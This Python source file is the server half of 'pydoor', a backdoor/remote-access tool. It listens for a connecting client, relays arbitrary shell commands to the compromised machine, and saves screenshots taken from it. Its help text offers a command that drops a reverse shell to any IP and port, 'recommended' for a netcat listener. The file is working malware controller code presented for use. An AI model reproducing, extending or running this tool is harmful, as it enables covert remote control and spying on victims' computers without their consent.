#!/usr/bin/env python

import socket
from PIL import Image
import time
import sys
import argparse
import base64
import pyautogui
import os
import datetime
import threading

BUFFER = 4096

class Server:

    def __init__(self):
        self.sock = 0
        self.con = 0
        self.host = 0
        self.cmd = 0
        self.usage = """
pydoor integrated shell help.


sleep | Break the connection with the client, but the client will still run and wait for a server. 
quit | Kills the client and the server.
shell [ip] [port]  | Drop a reverse shell to the ip and port specified depending on your current shell, it is recommended to send it to a netcat listener.
setshell [absolute/path/to/shell] | Change the shell that the integrated shell will be wrapped around.       

**Running any other command will make the client attempt to run it with /bin/bash or /bin/sh, or the shell specified via setshell.
        
        
        """

        self.quitwarning = """WARNING : Running quit will kill the client program, proceed ? [Y/n]: """
        self.args = 0
        self.port = 0


    def parse_args(self):
        parser = argparse.ArgumentParser(
            description='pydoor_decription.')
        parser.add_argument('-p', '--port', default=9999, help='Port to listen on for client connection.', type=int)
        self.args = parser.parse_args()
        self.port = self.args.port



    def handle_response(self, resp):

        encodedresp = resp
        resp = resp.decode('utf-8', 'ignore')
        if "pydoor.quit" in resp:
            print("Quit signal received from client " + self.host)
            os._exit(0) 
        elif "pydoor_null" in resp:
            return
        elif self.cmd == "screenshot":
            #resp = encodedresp.replace(b"Screenshot ", b"")
            #resp = resp.replace('.', '=')
            #screenshot_bytes = base64.b64decode(resp)
            screenshot_bytes = encodedresp
            file_name = str(datetime.datetime.now().strftime("%d-%m-%Y-%H-%M-%S")) +".png"
            #os.mknod(file_name)

            with open(file_name, 'wb+') as f:
                f.write(screenshot_bytes)
        else:
            print(resp)



    def recvall(self):
        data = b''
        while True:
            part = self.con.recv(BUFFER)
            data += part
            if len(part) < BUFFER:
                break
        return data

    def preprocesscmd(self):

        if self.cmd == "shellhelp":
            print(self.usage)
            return 1

        elif self.cmd == "quit":
            choice =  input(self.quitwarning)

            if choice.lower() == "y" or choice.lower() == "yes":
                return 0
            else:
                return 1


        
        else:
            return 0

    def shinput(self):
        while True:
            self.cmd = input(">")
            if self.cmd == "":
                continue
            if (self.preprocesscmd() == 0):

                self.con.sendall(self.cmd.encode())
                dat = self.recvall()
                self.handle_response(dat)
            else:
                pass





    def start(self):

        self.parse_args()

        print("Starting server")

        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)


        self.sock.bind(("127.0.0.1", self.port))

        self.sock.listen(1)

        print(f"Listening on {self.port}, waiting for connection from client")

        while True:
            
            self.con, addr = self.sock.accept()
            rdata = self.con.recv(BUFFER)
            

            if rdata:
                self.host = str(self.sock.getsockname()).strip("(").strip(")").strip(",").replace("'", "") #Remove tuple stuff like parentheses before printing, we dont need any anyways
                
                print(f"Connection received from client, {self.host} dropping shell")
                inp = threading.Thread(target=self.shinput)
                inp.start()
                inp.join()
                
if __name__ == "__main__":
    s = Server()

    s.start()